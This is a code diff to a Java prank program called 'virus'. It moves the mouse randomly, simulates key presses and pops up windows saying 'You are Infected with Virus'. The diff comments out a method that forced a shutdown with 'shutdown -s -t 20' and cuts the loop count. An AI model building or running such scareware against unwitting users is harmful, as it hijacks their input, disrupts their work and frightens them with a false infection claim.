@@ -16,27 +16,35 @@ public class virus{
         robot.keyPress(KeyEvent.VK_SHIFT);
         robot.mouseMove(Random.nextInt(width),Random.nextInt(height));
     }
-    public void popup(){
+    public void image(){
         JWindow window = new JWindow();
-        ImageIcon iconLogo = new ImageIcon("hacker.jpg");
+        ImageIcon iconLogo = new ImageIcon("VIRUS.jpg");
         JLabel l = new JLabel(iconLogo,JLabel.CENTER);
         window.add(l);
         window.setSize(300,200);
         window.setLocation(Random.nextInt(width), Random.nextInt(height));
         window.setVisible(true);
     }
-    public void close(){
-        Runtime runtime = Runtime.getRuntime();
-      try
-      {
-         System.out.println("Shutting down the PC after 20 seconds.");
-         runtime.exec("shutdown -s -t 20");
-      }
-      catch(IOException e)
-      {
-         System.out.println("Exception: " +e);
-      }
+    public void popup(){
+        JWindow window = new JWindow();
+        JLabel l = new JLabel("You are Infected with Virus",JLabel.CENTER);
+        window.add(l);
+        window.setSize(300,200);
+        window.setLocation(Random.nextInt(width), Random.nextInt(height));
+        window.setVisible(true);
     }
+    // public void close(){
+    //     Runtime runtime = Runtime.getRuntime();
+    //   try
+    //   {
+    //      System.out.println("Shutting down the PC after 20 seconds.");
+    //      runtime.exec("shutdown -s -t 20");
+    //   }
+    //   catch(IOException e)
+    //   {
+    //      System.out.println("Exception: " +e);
+    //   }
+    // }
     public static void main(String[] args) throws AWTException, InterruptedException 
     {
         virus v =  new virus();
@@ -55,7 +63,7 @@ public class virus{
 
         b.addActionListener(new ActionListener() {
             public void actionPerformed(ActionEvent e){
-                for (int i = 0; i < 150; i++)
+                for (int i = 0; i < 10; i++)
                 {
                     try {
                         v.blockAll();
@@ -63,8 +71,9 @@ public class virus{
                         e1.printStackTrace();
                     }
                     v.popup();
+                    v.image();
                 }
-                v.close();
+                // v.close();
             }
         });
         
